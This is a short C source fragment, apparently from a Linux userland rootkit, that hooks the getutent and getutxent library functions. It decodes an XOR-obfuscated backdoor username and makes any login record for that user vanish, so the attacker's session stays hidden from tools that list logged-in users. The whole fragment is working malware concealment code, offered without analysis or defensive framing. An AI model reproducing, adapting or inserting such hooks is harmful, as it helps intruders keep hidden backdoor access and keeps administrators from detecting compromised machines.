struct utmp *getutent(void)
{
    HOOK(o_getutent,CGETUTENT);
    struct utmp *tmp = o_getutent();

    if(tmp && tmp->ut_user != NULL)
    {
        char *bduname=strdup(BD_UNAME); xor(bduname);
        if(!strcmp((char *)tmp->ut_user,bduname)) { CLEAN(bduname); errno=ESRCH; return NULL; }
        CLEAN(bduname);
    }

    return o_getutent();
}

struct utmpx *getutxent(void)
{
    HOOK(o_getutxent,CGETUTXENT);
    struct utmpx *tmp = o_getutxent();

    if(tmp && tmp->ut_user != NULL)
    {
        char *bduname=strdup(BD_UNAME); xor(bduname);
        if(!strcmp((char *)tmp->ut_user,bduname)) { CLEAN(bduname); errno=ESRCH; return NULL; }
        CLEAN(bduname);
    }

    return o_getutxent();
}
